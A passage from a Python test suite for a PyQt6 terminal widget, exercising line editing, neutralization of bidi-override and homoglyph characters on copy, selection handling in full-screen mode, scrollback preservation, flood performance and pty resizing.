    _drive_fullscreen(['htop'], 'CPU', b'q', 'htop')
    _drive_fullscreen(['nano', '/tmp/st-nano-e2e.txt'], 'GNU nano', b'\x18n', 'nano')  # nosec B108 -- scratch file arg for the nano E2E drive
    # Name the session's command explicitly. `new-session` with no command runs
    # the user's LOGIN SHELL, so tmux names the window after it and the readiness
    # token becomes environment-dependent -- 'bash' in the CI container, 'zsh' on
    # a box whose default shell differs, where this asserted on the wrong string.
    _drive_fullscreen(['tmux', '-f', '/dev/null', 'new-session', '/bin/bash'],
                      'bash', b'\x02:kill-server\r', 'tmux', expect_exit=False)

# --- line editing can be turned off, making the widget append-only ------------
# The setting exists because honouring erase-in-line means a program CAN overwrite
# what it just printed on the current line. With it off the widget must keep both
# strings, and toggling live must re-render the retained output under the new rule.
_le = SecureTerminal(command='/bin/cat')
_le.apply_mode('box')
ok(_le.line_edits_enabled(), 'line editing is on by default')
feed_output(_le, b'STATUS=FAIL\x1b[2KSTATUS=PASS\n')
ok('STATUS=FAIL' not in _le.toPlainText(),
   'line editing on: the erase redraws the line, so FAIL is gone')
_le.apply_line_edits(False)
ok(not _le.line_edits_enabled(), 'apply_line_edits(False) takes effect')
ok('STATUS=FAIL' in _le.toPlainText() and 'STATUS=PASS' in _le.toPlainText(),
   'turning line editing off re-renders the retained output, so FAIL is back')
_le.close()

_le2 = SecureTerminal(command='/bin/cat', line_edits=False)
_le2.apply_mode('box')
ok(not _le2.line_edits_enabled(), 'the ctor kwarg is honored (session restore path)')
feed_output(_le2, b'STATUS=FAIL\x1b[2KSTATUS=PASS\n')
_le2_doc = _le2.toPlainText()
ok('STATUS=FAIL' in _le2_doc and 'STATUS=PASS' in _le2_doc,
   'line editing off: output is append-only, both strings survive')
ok('\x1b' not in _le2_doc and '[2K' not in _le2_doc,
   'line editing off: the escape is consumed, not shown as [2K residue')
_le2.close()

# --- render-only preview: re-render safe, and no formatting leak between shows -
pv = SecureTerminal(preview=True)
pv.render_preview('hello\u00e9', mode='detail', markings=True)
ok(pv.toPlainText(), 'a preview renders content')
eq(pv._raw, 'hello\u00e9', 'render_preview retains the text as _raw (not blanked)')
pv.apply_mode('box')                        # re-renders from _raw; _raw='' would blank it
ok(pv.toPlainText(), 'a mode change re-renders the preview from _raw instead of blanking it')
# a preview whose text left an unclosed SGR must not bleed into the next preview
pv.render_preview('a\x1b[31mb', mode='show', markings=False)
pv.render_preview('plain', mode='show', markings=False)
eq(pv._sgr, {'fg': None, 'bg': None, 'bold': False},
   'render_preview resets SGR, so a prior preview\'s formatting does not leak')
# Double-clicking a neutralized character opens the inspect popup; its Copy button
# must place the \uXXXX ESCAPE on the clipboard, never the raw glyph -- copying a
# bidi override or homoglyph as-is is the exact hazard this terminal guards against
# (#300/#301). Prove it for a few high-risk codepoints across the whole popup path.
from PyQt6.QtWidgets import QPushButton as _QPushButton   # noqa: E402
from PyQt6.QtCore import QPoint as _QPoint                # noqa: E402
cpop = SecureTerminal(command='/bin/cat')
for _cp in (0x202E,        # RIGHT-TO-LEFT OVERRIDE (bidi)
            0x200B,        # ZERO WIDTH SPACE (invisible)
            0x0430,        # CYRILLIC SMALL A (homoglyph of ASCII 'a')
            0x1F4A9):       # a non-BMP codepoint -> \U escape
    APP.clipboard().clear()
    cpop = SecureTerminal(command='/bin/cat')
    cpop._show_char_popup(_cp, _QPoint(10, 10))
    dlg = cpop._char_popup
    btn = next(b for b in dlg.findChildren(_QPushButton)
               if b.text().startswith('Copy'))
    btn.click()
    got = APP.clipboard().text()
    want = ('\\u%04x' % _cp) if _cp <= 0xFFFF else ('\\U%08x' % _cp)
    eq(got, want, 'popup Copy yields the escape for U+%04X' % _cp)
    ok(chr(_cp) not in got,
       'popup Copy never places the raw glyph U+%04X on the clipboard' % _cp)
    dlg.close()
# the popup is usable: EVERY label (incl. the explanatory note, not just the
# name) is selectable so its text can be marked and copied, and the Copy button
# confirms visibly so it never looks like a no-op.
from PyQt6.QtCore import Qt as _QtIP                      # noqa: E402
from PyQt6.QtWidgets import QLabel as _QLabelIP           # noqa: E402
_ipop = SecureTerminal(command='/bin/cat')
_ipop._show_char_popup(0x0430, _QPoint(10, 10))
_idlg = _ipop._char_popup
_isel = _QtIP.TextInteractionFlag.TextSelectableByMouse
ok(all(_lb.textInteractionFlags() & _isel for _lb in _idlg.findChildren(_QLabelIP)),
   'every popup label (incl. the note) is selectable, so its text can be copied')
_icopy = next(b for b in _idlg.findChildren(_QPushButton)
              if b.text().startswith('Copy'))
_icopy.click()
ok(_icopy.text().startswith('Copied'),
   'the popup Copy button confirms the copy (text becomes "Copied ...")')
_idlg.close()
# the inspect popup names a box-drawing / block-element glyph as STRUCTURAL, not as
# generic "foreign text": marking_class still reports it 'nonascii' (paste-review
# parity), so the popup must special-case the honest structural label itself.
_spop = SecureTerminal(command='/bin/cat')
_spop._show_char_popup(0x2500, _QPoint(10, 10))
_slbl = ' '.join(_lb.text() for _lb in _spop._char_popup.findChildren(_QLabelIP)).lower()
ok('structural' in _slbl,
   'popup labels a box-drawing glyph as structural (benign), not a risk class')
ok('foreign text' not in _slbl,
   'popup does not mislabel a box-drawing glyph as generic non-ASCII foreign text')
_spop._char_popup.close()
# a write lands where a program left the cursor mid-line (zsh prompt + fill),
# not at end-of-document -- the wall-of-spaces-before-input bug
pc = SecureTerminal(command='/bin/cat')
pc._append('P% ')            # prompt
pc._append(' ' * 8)           # trailing fill beyond the cursor
pc._append('\r')              # carriage return -> column 0
pc._append('P% ')             # redraw the prompt over the fill
pc._append('x')               # the echo must land right after the prompt
ok(pc.toPlainText().startswith('P% x'), 'write lands at the persistent cursor')
# backspace over a reveal badge deletes the whole character in the WIDGET (#119):
# the badge is 8 display columns but one logical cell.
bb = SecureTerminal(command='/bin/cat')
bb.apply_mode('reveal')
bb._append('echo ' + chr(0x20AC))
ok(bb.toPlainText().endswith('<U+20AC>'), 'widget shows the reveal badge')
bb._append('\b\x1b[K')                 # readline backspace: one cell + erase-EOL
ok(bb.toPlainText().endswith('echo ') and '<U+' not in bb.toPlainText(),
   'backspace removes the whole badge in the widget (#119)')
# a plain click must not strand the blinking caret where you cannot type: input
# always goes to the shell at the output cursor, so mouseReleaseEvent snaps the
# caret back unless a drag made a selection (which is kept, for copy).
from PyQt6.QtGui import QMouseEvent, QTextCursor      # noqa: E402
from PyQt6.QtCore import QPointF                       # noqa: E402
cs = SecureTerminal(command='/bin/cat')
cs._append('prompt> ')
_out = cs._out_cursor.position()
_stray = QTextCursor(cs.document())
_stray.setPosition(2)                                  # as if a click landed here
cs.setTextCursor(_stray)
_release = QMouseEvent(QEvent.Type.MouseButtonRelease, QPointF(1, 1), QPointF(1, 1),
                       Qt.MouseButton.LeftButton, Qt.MouseButton.NoButton,
                       Qt.KeyboardModifier.NoModifier)
cs.mouseReleaseEvent(_release)
eq(cs.textCursor().position(), _out, 'plain click snaps the caret back to output')
# a selection (drag) survives the release, so copy still works
_sel = QTextCursor(cs.document())
_sel.setPosition(0)
_sel.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
cs.setTextCursor(_sel)
cs.mouseReleaseEvent(_release)
ok(cs.textCursor().hasSelection(), 'a drag selection survives the release')

# Regression (operator): the TUI grid rebuild must NOT run while a selection is active, or
# it re-anchors the selection and drags it to the bottom. A left press marks the drag; while
# a selection is held _render_tui is a no-op (the view freezes) so the selection is preserved.
_selfz = SecureTerminal(command='/bin/cat', tui=True)
_selfz.resize(700, 300)
_selfz.show()
pump(40)
for _i in range(60):
    _selfz._feed_stream(('row-%d\r\n' % _i).encode())
_selfz._render_tui()
def _set_sel(term, a=5, p=20):
    tc = QTextCursor(term.document())
    tc.setPosition(a)
    tc.setPosition(p, QTextCursor.MoveMode.KeepAnchor)
    term.setTextCursor(tc)
_selpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(1, 1), QPointF(1, 1),
                        Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                        Qt.KeyboardModifier.NoModifier)
_selfz.mousePressEvent(_selpress)          # begins a drag; clears any prior selection
ok(_selfz._mouse_selecting, 'a left-button press marks a drag-selection in progress')
_set_sel(_selfz)                           # the drag extends a selection while _mouse_selecting
_selfz._feed_stream(b'more-output\r\n')
_selfz._render_tui()
eq((_selfz.textCursor().anchor(), _selfz.textCursor().position()), (5, 20),
   'TUI rebuild is frozen during a drag -- the selection is not dragged to the bottom')
_selfz.mouseReleaseEvent(_release)
ok(not _selfz._mouse_selecting, 'mouse release ends the drag-selection freeze')
_set_sel(_selfz)                           # a completed selection is still held
_selfz._feed_stream(b'and-more\r\n')
_selfz._render_tui()
eq((_selfz.textCursor().anchor(), _selfz.textCursor().position()), (5, 20),
   'a held selection keeps the rebuild frozen so it is not collapsed')
# a NON-left press does not begin a drag-selection freeze (button branch)
_selfz.setTextCursor(QTextCursor(_selfz.document()))   # clear selection first
_rpress = QMouseEvent(QEvent.Type.MouseButtonPress, QPointF(1, 1), QPointF(1, 1),
                      Qt.MouseButton.RightButton, Qt.MouseButton.RightButton,
                      Qt.KeyboardModifier.NoModifier)
_selfz.mousePressEvent(_rpress)
ok(not _selfz._mouse_selecting, 'a non-left press does not mark a drag-selection')
_selfz.close()

# Regression (ai-review): typing in TUI mode CLEARS a held selection so the frozen grid
# resumes. TUI keys go straight to the child (never Qt's editor), so without this the
# selection would persist and _render_tui stay a no-op until a mouse click.
_seltype = SecureTerminal(command='/bin/cat', tui=True)
_seltype.resize(700, 300)
_seltype.show()
pump(40)
for _i in range(20):
    _seltype._feed_stream(('t-%d\r\n' % _i).encode())
_seltype._render_tui()
_stc = QTextCursor(_seltype.document())
_stc.setPosition(3)
_stc.setPosition(9, QTextCursor.MoveMode.KeepAnchor)
_seltype.setTextCursor(_stc)
ok(_seltype.textCursor().hasSelection(), 'a completed selection is established')
key(_seltype, Qt.Key.Key_A, 'a')
ok(not _seltype.textCursor().hasSelection(),
   'typing in TUI mode clears a held selection so the frozen grid resumes')
_seltype.close()

# Regression (operator, "sticky marker"): while the child grabs the mouse (tracking + SGR), a
# plain click is FORWARDED to the child and never reaches Qt's editor, so a held selection used
# to persist and freeze the grid rebuild (a stuck highlight) until a keypress. mousePressEvent
# now clears the selection (_clear_grid_selection) on the plain-report branch before forwarding
# the click, so a plain click dismisses it.
_selstick = SecureTerminal(command='/bin/cat', tui=True)
_selstick.resize(700, 300)
_selstick.show()
pump(40)
for _i in range(60):
    _selstick._feed_stream(('row-%d\r\n' % _i).encode())
_selstick._render_tui()
_ss_sent = spy_writes(_selstick)           # the forwarded click reports to the child; capture it
feed_output(_selstick, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h')   # child arms mouse reporting
ok(_selstick._mouse_report_on(),
   'canary: mouse reporting is armed, so a plain click is forwarded (not a local selection)')
_ss_tc = QTextCursor(_selstick.document())
_ss_tc.setPosition(5)
_ss_tc.setPosition(20, QTextCursor.MoveMode.KeepAnchor)
_selstick.setTextCursor(_ss_tc)
ok(_selstick.textCursor().hasSelection(), 'canary: a held selection is established before the click')
_selstick.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton, pos=(50, 50)))
ok(not _selstick.textCursor().hasSelection(),
   'a plain click in a mouse-reporting TUI dismisses a stuck selection before forwarding the click')
_selstick.close()

# Regression (operator, "single line unselectable"): Shift is the mandatory local override to
# bypass the child's mouse grab, but Qt reads Shift+press as EXTEND-from-current-cursor, and the
# render loop pins that cursor to the child's cursor (_place_grid_cursor). Every Shift-drag then
# anchored at the pinned cursor -- a single line was unselectable. mousePressEvent now collapses
# the cursor to the click FIRST, so a Shift bypass-press starts a FRESH selection at the click.
_selfresh = SecureTerminal(command='/bin/cat', tui=True)
_selfresh.resize(700, 300)
_selfresh.show()
pump(40)
for _i in range(60):
    _selfresh._feed_stream(('line-%d\r\n' % _i).encode())
_selfresh._render_tui()
_sf_sent = spy_writes(_selfresh)
feed_output(_selfresh, b'\x1b[?1000h\x1b[?1002h\x1b[?1003h\x1b[?1006h')   # child arms mouse reporting
_sf_click = (80, 40)
_sf_clickpos = _selfresh.cursorForPosition(_QP(*_sf_click)).position()
_sf_far = QTextCursor(_selfresh.document())
_sf_far.setPosition(_selfresh.document().characterCount() - 2)   # pin the cursor FAR, as the render loop does
_selfresh.setTextCursor(_sf_far)
ok(_selfresh._mouse_report_on() and _selfresh.textCursor().position() != _sf_clickpos,
   'canary: mouse reporting is armed and the cursor is pinned FAR from the click')
_selfresh.mousePressEvent(_mev(QEvent.Type.MouseButtonPress, Qt.MouseButton.LeftButton,
                               mods=Qt.KeyboardModifier.ShiftModifier, pos=_sf_click))
eq(_selfresh.textCursor().anchor(), _sf_clickpos,
   'a Shift bypass-press anchors a FRESH selection at the click, not extending from the pinned grid cursor')
_selfresh.close()
# scrollback navigation in line mode: PageUp scrolls the buffer up, Shift+Home/
# End jump to the ends, plain Home is left for line editing (does not scroll)
sc = SecureTerminal(command='/bin/cat')
sc.resize(600, 200)
sc.show()
for _i in range(200):
    sc._append('line %d\n' % _i)
_bar = sc.verticalScrollBar()
_bottom = _bar.value()
key(sc, Qt.Key.Key_PageUp)
ok(_bar.value() < _bottom, 'PageUp scrolls the scrollback up')
key(sc, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.maximum(), 'Shift+End jumps to the bottom')
key(sc, Qt.Key.Key_Home, mods=Qt.KeyboardModifier.ShiftModifier)
eq(_bar.value(), _bar.minimum(), 'Shift+Home jumps to the top')
_bar.setValue(50)
key(sc, Qt.Key.Key_Home)
eq(_bar.value(), 50, 'plain Home does not scroll (reserved for editing)')
# flood must not hang: a large control-laden blob (every byte 0x00-0xff, so it
# carries CR/BS/NL) renders in bounded time and bounded document size. This is
# the "cat /dev/random freeze" regression -- the old per-char cursor path took
# minutes; the bulk path is seconds.
import time as _time                                  # noqa: E402
from secure_terminal import sanitize as _S            # noqa: E402
fl = SecureTerminal(command='/bin/cat')
fl.resize(600, 300)
_blob = _S.render_output((bytes(range(256)) * 8000).decode('latin-1'), 'box')


def _append_seconds(widget, text, times=1):
    _t0 = _time.time()
    for _ in range(times):
        widget._append(text)
    return _time.time() - _t0


# SELF-CALIBRATED, because a wall clock is not the invariant. `elapsed < 30` measured
# 48.9s on a loaded box and ~5s idle on identical code: it raced the machine, and a
# security test that cries wolf gets muted.
#
# Comparing against plain text does NOT work either (measured: plain 18.2s vs
# control-laden 15.1s). Plain text is SLOWER, because 25k newlines dominate via
# maximumBlockCount pruning rather than per-character work -- so that ratio could
# never exceed its threshold and the assertion would be incapable of failing.
#
# So calibrate on the SAME content at 1/8 the volume and require the full flood to
# stay near-linear against it. Load scales both measurements. The regression this
# guards (the old per-char cursor path, minutes vs seconds) is superlinear, so it
# would blow the multiplier out by orders of magnitude, while a merely slow machine
# moves both numbers together and still passes.
_small = _blob[:len(_blob) // 8]
_fl_cal = SecureTerminal(command='/bin/cat')
_fl_cal.resize(600, 300)
_t_small = _append_seconds(_fl_cal, _small)
_fl_cal.close()
_elapsed = _append_seconds(fl, _blob, times=2)        # ~4MB of control-laden output
# The flood pushes 16x the calibration volume (8x the text, twice). max() floors a
# machine fast enough to report ~0, which would make the budget zero.
_budget = max(_t_small, 0.05) * 16 * 3               # 3x headroom for pruning + noise
ok(_elapsed < _budget,
   'control-laden flood stays near-linear (%.1fs vs %.1fs budget from a %.2fs '
   'eighth-sample)' % (_elapsed, _budget, _t_small))
# An absolute ceiling too, loose on purpose: it only has to catch a true HANG, which
# no ratio can -- a hang never returns a second measurement to compare.
ok(_elapsed < 120, 'control-laden flood does not hang (%.1fs)' % _elapsed)
ok(fl.document().blockCount() <= 10000,
   'flood document stays bounded (%d blocks)' % fl.document().blockCount())
# keyboard tab navigation: the widget emits tab_step / tab_move so the window can
# switch or reorder tabs (Ctrl+PageUp/Down and the Shift variants)
nav = SecureTerminal(command='/bin/cat')
_steps, _moves = [], []
nav.tab_step.connect(_steps.append)
nav.tab_move.connect(_moves.append)
key(nav, Qt.Key.Key_PageDown, mods=Qt.KeyboardModifier.ControlModifier)
key(nav, Qt.Key.Key_PageUp,
    mods=Qt.KeyboardModifier.ControlModifier | Qt.KeyboardModifier.ShiftModifier)
eq((_steps, _moves), ([1], [-1]),
   'Ctrl+PageDown steps tab, Ctrl+Shift+PageUp moves tab')
# a display-mode toggle re-renders the WHOLE existing buffer, not only new output
rr = SecureTerminal(command='/bin/cat')
_rr_raw = 'cafe' + chr(0x00E9) + '\n'
rr._raw = _rr_raw
rr._append(_S.render_output(_rr_raw, 'box'))
eq(rr.toPlainText().rstrip(), 'cafe_', 'box shows non-ascii as _')
rr.apply_mode('reveal')
eq(rr.toPlainText().rstrip(), 'cafe<U+00E9>', 'reveal re-renders existing scrollback')
rr.apply_mode('show')
eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
rr.apply_mode('box')
eq(rr.toPlainText().rstrip(), 'cafe_', 'box re-renders the scrollback back')
# a SAVED transcript is lossless: fed through the real render path (so each box
# carries its source codepoint), Box mode names the byte inline (Detail) with
# line-edits already RESOLVED (a \r overwrite is applied, not concatenated),
# while a copy / plain text still collapses the box to '_'.
_tr = SecureTerminal(command='/bin/cat')
_tr.apply_mode('box')
_tr._feed_line('load 10%\rdone caf\xe9\n')     # \r overwrite, then a homoglyph
eq(_tr.toPlainText().rstrip(), 'done caf_',
   'box display/copy: the \\r overwrite is resolved and the box maps to "_"')
eq(_tr.transcript_text().rstrip(), 'done caf<U+00E9 LATIN SMALL LETTER E WITH ACUTE>',
   'box transcript: line edits resolved AND the codepoint named (lossless), not "_"')
_tr.shutdown()
# a REAL U+25A1 the program printed is kept as its glyph in Show mode -- it is not
# a neutralization placeholder, so a saved transcript must not rewrite it to a
# <U+25A1 ...> badge or '_' (the _export_ascii Show invariant). A neutralized
# no-glyph char shown as a box still names its own (different) codepoint.
_trs = SecureTerminal(command='/bin/cat')
_trs.apply_mode('show')
_trs._feed_line('a' + chr(0x25A1) + chr(0x202E) + 'b\n')   # real box + bidi override
_ts = _trs.transcript_text()
ok(chr(0x25A1) in _ts and 'U+25A1' not in _ts,
   'show transcript: a real U+25A1 glyph is kept, not rewritten as a placeholder')
ok('U+202E' in _ts,
   'show transcript: a neutralized bidi shown as a box still names its codepoint')
_trs.shutdown()
# a mode toggle after a flood re-renders only the recent tail, not the full
# scrollback: reveal expands each byte to an 8-char <U+XXXX>, so re-rendering 1MB
# of raw would be ~8MB and freeze the UI. Bounded, the document stays small.
rf = SecureTerminal(command='/bin/cat')
rf._raw = (b''.join(bytes([i % 256]) for i in range(1000)) * 1000).decode('latin-1')
rf.apply_mode('reveal')
ok(len(rf.toPlainText()) < 1_200_000,
   'mode toggle re-renders only the bounded tail, not the whole 8MB expansion')
# regression: switching CLI<->TUI at a shell prompt must NOT blank the scrollback.
# TUI only takes over the screen while a full-screen program is on the alt screen;
# with just a shell it stays in line display, so toggling is a visual no-op and
# the history survives. (Fixed a bug where apply_tui() rendered a blank pyte grid
# over the scrollback the moment TUI was enabled.)
sw = SecureTerminal(command='/bin/cat')
_scroll = 'history-line-A\nhistory-line-B\nhistory-line-C\n'
sw._raw = _scroll
sw._append(_S.render_output(_scroll, 'box'))
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'scrollback present in CLI mode')
sw.apply_tui(True)
ok('history-line-A' in sw.toPlainText(),
   'CLI->TUI at a shell prompt keeps the scrollback (not blanked)')
sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText(), 'TUI->CLI keeps the scrollback')
for _ in range(5):
    sw.apply_tui(True)
    sw.apply_tui(False)
ok('history-line-A' in sw.toPlainText() and 'history-line-C' in sw.toPlainText(),
   'repeated CLI<->TUI toggling preserves the scrollback (solid)')
# and when a full-screen program DOES take the grid then exits, the scrolling
# document is rebuilt from retained output (only runs where pyte is installed).
sw.apply_tui(True)
if sw.current_tui():
    sw._alt_screen = True
    sw._sync_display()                      # a full-screen program takes the grid
    sw._alt_screen = False
    sw._sync_display()                      # it exits -> scrollback rebuilt
    ok('history-line-A' in sw.toPlainText(),
       'scrollback restored after a full-screen program exits')
sw.apply_tui(False)
# regression: applying an UNRELATED global setting must not erase TUI scrollback.
# _apply_global re-applies the SAME scrollback value to every tab on every global-
# settings change (theme, font, zoom, ...). apply_scrollback used to unconditionally
# clear the document and rebuild the TUI view from pyte's bounded history (cap 2000),
# so any promoted scrollback row ABOVE that cap -- which exists only in the document --
# was silently dropped. With the default scrollback (10000 > pyte's 2000 cap) that
# erased visible history on an unrelated setting change.
_sb = SecureTerminal(command='/bin/cat', tui=True)
if _sb.current_tui():
    _sb.show()
    _sb.resize(800, 400)                             # a real viewport so the grid renders
    _sbN = 2300                                      # > pyte's 2000-line history cap
    # Feed in chunks and pump so the debounced grid render (_render_timer) fires and
    # promotes each scrolled-off batch into the document; a single feed larger than
    # pyte's history would overflow it before the promote pass runs.
    for _sbi in range(0, _sbN, 100):
        feed_output(_sb, ''.join('row-%04d\n' % i
                                 for i in range(_sbi, min(_sbi + 100, _sbN))).encode('ascii'))
        pump(20)
    pump(50)
    # setup canary: the oldest rows live ONLY in the document (pyte kept the last
    # ~2000), proving the document holds more than pyte's history cap.
    ok('row-0000' in _sb.toPlainText(),
       'TUI scrollback: the oldest promoted row is retained in the document')
    _sbBlocks = _sb.blockCount()
    # apply the SAME scrollback -- exactly what _apply_global does on any unrelated
    # setting. The destructive rebuild must NOT fire: nothing was pruned.
    _sb.apply_scrollback(_sb.current_scrollback())
    ok('row-0000' in _sb.toPlainText(),
       'apply_scrollback(unchanged) keeps the promoted scrollback (no destructive rebuild)')
    eq(_sb.blockCount(), _sbBlocks,
       'apply_scrollback(unchanged) does not shrink the document')
    # a RAISE prunes nothing either, so it too must preserve the promoted rows.
    _sb.apply_scrollback(_sb.current_scrollback() * 2)
    ok('row-0000' in _sb.toPlainText(),
       'apply_scrollback(raise) preserves the promoted scrollback (no prune, no rebuild)')
    # a genuine REDUCTION below the document size prunes and resyncs the grid model.
    _sb.apply_scrollback(500)
    eq(_sb.current_scrollback(), 500, 'apply_scrollback(reduce) applies the new cap')
    ok(_sb.blockCount() <= 500,
       'apply_scrollback(reduce) prunes the document to the new cap')
_sb.close()

# regression (#7): a debounced CLI paint must NOT survive entry into the TUI grid.
# _sync_display is reached directly from apply_tui (not via _rerender), so a still-
# armed _paint_timer would fire _flush_paint AFTER the grid is built and write stale
# CLI content into the grid document, corrupting it. Pre-fix the timer stayed armed.
pw = SecureTerminal(command='/bin/cat')
pw.apply_tui(True)
if pw.current_tui():
    pw._paint_dirty = True
    pw._paint_timer.start(0)                # arm the CLI paint debounce
    ok(pw._paint_timer.isActive(), 'a CLI paint is armed before the grid takes over')
    pw._alt_screen = True
    pw._sync_display()                      # a full-screen program takes the grid
    ok(not pw._paint_timer.isActive() and not pw._paint_dirty,
       'grid entry drops the pending CLI paint (no stale _flush_paint corrupts the grid)')
    pw._alt_screen = False
pw.apply_tui(False)
# CLI->TUI grid fits the viewport: no useless horizontal scrollbar and no clipped
# right edge. The grid must be sized to the text AREA (viewport minus the doc
# margins): the raw viewport is one column too wide and overflows.
gz = SecureTerminal(command='/bin/cat')
gz.resize(820, 400)
gz.show()
pump(40)
ok(gz.horizontalScrollBarPolicy() == Qt.ScrollBarPolicy.ScrollBarAsNeeded,
   'the horizontal scrollbar is AS-NEEDED (kept only for expanded-Unicode overflow)')
ok(gz.horizontalScrollBar().maximum() == 0,
   'a grid that fits the viewport shows no horizontal scrollbar (nothing to scroll)')
_gcols, _grows = gz._tui_grid_size()
_gcw = gz.fontMetrics().horizontalAdvance('M') or 1
_gmargin = int(gz.document().documentMargin())
_gvbar = gz.verticalScrollBar().width() if gz.verticalScrollBar().isVisible() else 0
ok(_gcols * _gcw <= gz.viewport().width() - 2 * _gmargin + _gvbar,
   'the TUI grid columns fit the text area, so the grid never overflows sideways')
# --- TUI is a full emulator: primary-screen redraws (completion menus), CLI<->TUI
# scrollback, and full-screen apps all render (only where pyte is installed) ------
if tui_available():
    # a completion-menu style cursor-up redraw OVERWRITES the listing line instead
    # of piling up (the whole point of #184: the grid honours cursor-up)
    _mprog = os.path.join(tempfile.mkdtemp(prefix='st-menu-'), 'menu.sh')
    with open(_mprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'printf "prompt> cd \\n"\n'
                 'printf "dirA  dirB\\n"\n'
                 'printf "\\033[Aprompt> cd dirA\\033[K\\n"\n'   # cursor up + redraw
                 'sleep 3\n')
    os.chmod(_mprog, 0o700)
    _mt = SecureTerminal(command=_mprog, tui=True)
    _mt.resize(600, 300)
    _mt.show()
    pump(400)
    _mlines = [ln.rstrip() for ln in _mt.toPlainText().split('\n') if ln.strip()]
    ok('prompt> cd dirA' in _mlines and 'dirA  dirB' not in _mlines,
       'a cursor-up redraw (completion menu) overwrites in the grid, not piles up')
    # CLI->TUI keeps the scrollback (seeded from retained output), and TUI->CLI
    # keeps the output produced while in TUI
    _hprog = os.path.join(tempfile.mkdtemp(prefix='st-hist-'), 'h.sh')
    with open(_hprog, 'w') as _f:
        _f.write('#!/bin/sh\nfor i in 1 2 3 4 5; do echo "scrollback-$i"; done\nsleep 3\n')
    os.chmod(_hprog, 0o700)
    _ht = SecureTerminal(command=_hprog)          # start in CLI
    _ht.resize(600, 300)
    _ht.show()
    pump(400)
    ok('scrollback-3' in _ht.toPlainText(), 'output present in CLI mode')
    _ht.apply_tui(True)
    pump(120)
    ok('scrollback-3' in _ht.toPlainText(),
       'CLI->TUI keeps the scrollback (grid seeded from retained output)')
    # a full-screen program (alternate screen) is restored on exit: its frame does
    # not pollute the scrollback and the pre-program screen comes back
    _fprog = os.path.join(tempfile.mkdtemp(prefix='st-fs-'), 'fs.sh')
    with open(_fprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'echo primary-content\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049h\\033[2J\\033[HFULLSCREEN-FRAME"\n'
                 'sleep 0.4\n'
                 'printf "\\033[?1049l"\n'
                 'sleep 3\n')
    os.chmod(_fprog, 0o700)
    _ft = SecureTerminal(command=_fprog, tui=True)
    _ft.resize(600, 300)
    _ft.show()
    pump(1100)
    _ftext = _ft.toPlainText()
    ok('FULLSCREEN-FRAME' not in _ftext,
       'a full-screen program frame does not pollute the scrollback on exit')
    ok('primary-content' in _ftext,
       'the pre-program primary screen is restored when a full-screen app exits')
    # a tab that STARTS in TUI with restored scrollback keeps it, sets grid state,
    # and rebuilds the line document when switched to CLI (codex P1).
    _st = SecureTerminal(command='/bin/cat', tui=True, history='restored-scrollback\n')
    _st.resize(600, 300)
    _st.show()
    pump(120)
    ok(_st._grid_shown and 'restored-scrollback' in _st.toPlainText(),
       'a tab starting in TUI seeds its restored scrollback into the grid')
    _st.apply_tui(False)
    pump(60)
    ok('restored-scrollback' in _st.toPlainText(),
       'switching a TUI-started tab to CLI rebuilds the line document (keeps history)')
    # the shell's prompt that arrives in the SAME read as the alt-screen leave is
    # fed onto the restored primary, not discarded (codex P1).
    _pprog = os.path.join(tempfile.mkdtemp(prefix='st-lp-'), 'lp.sh')
    with open(_pprog, 'w') as _f:
        _f.write('#!/bin/sh\n'
                 'sleep 0.2\n'
                 'printf "\\033[?1049h\\033[2J\\033[HAPP"\n'
                 'sleep 0.3\n'
                 'printf "\\033[?1049lPROMPT-AFTER-LEAVE\\$ "\n'
                 'sleep 3\n')
    os.chmod(_pprog, 0o700)
    _pt = SecureTerminal(command=_pprog, tui=True)
    _pt.resize(600, 300)
    _pt.show()
    pump(900)
    ok('PROMPT-AFTER-LEAVE' in _pt.toPlainText(),
       'bytes after an alt-screen leave (the next prompt) land on the restored screen')
    # a scrollback cap smaller than the grid must not wipe the document (codex P2:
    # _grid_rows tracks ACTUAL blocks, so _delete_grid never goes negative).
    _tt = SecureTerminal(command='/bin/cat', tui=True)
    _tt.apply_scrollback(5)                # far smaller than the grid's row count
    _tt.resize(600, 400)
    _tt.show()
    pump(60)
    for _i in range(30):
        _tt._feed_stream(('grid-line-%d\r\n' % _i).encode())
    _tt._render_tui()                      # must not crash or blank the document
    ok(_tt.document().blockCount() >= 1 and _tt._grid_rows <= _tt.document().blockCount(),
       'a tiny scrollback cap does not corrupt the grid render')
    # the alt-screen split loop in _feed_stream always terminates: each iteration
    # advances past a marker (>= 6 bytes) or to the end -- feed pathological input
    # (back-to-back and empty-segment markers) and it must not hang or crash.
    _at = SecureTerminal(command='/bin/cat', tui=True)
    _at.resize(400, 200)
    _mk = [b'\x1b[?1049h', b'\x1b[?1049l', b'\x1b[?47h', b'\x1b[?47l']
    for _combo in (b''.join(_mk), b''.join(_mk * 3), b'x' + b''.join(_mk) + b'y',
                   b'\x1b[?1049h\x1b[?1049h\x1b[?1049l', b'', b'\x1b[?10', b'49h'):
        _at._feed_stream(_combo)          # returns (bounded) or the test would hang
    _at._render_tui()
    ok(_at.document().blockCount() >= 1,
       'the alt-screen split feed loop terminates on pathological marker input')
    # window resize keeps the pyte grid and the pty winsize in step (SIGWINCH), so
    # a TUI program repaints at the new width, and resizing while scrolled up does
    # not crash the incremental renderer.
    import fcntl as _fcntl, termios as _termios, struct as _struct     # noqa: E402
    _rt = SecureTerminal(command='/bin/cat', tui=True)
    _rt.resize(500, 300)
    _rt.show()
    pump(60)
    _small = _rt._screen.columns
    _rt.resize(1100, 600)
    pump(60)
    _grown = _rt._screen.columns
    _ws = _struct.unpack('HHHH', _fcntl.ioctl(
        _rt._fd, _termios.TIOCGWINSZ, _struct.pack('HHHH', 0, 0, 0, 0)))
    ok(_grown > _small and _ws[1] == _grown,
       'resize grows the pyte grid and updates the pty winsize (cols) together')
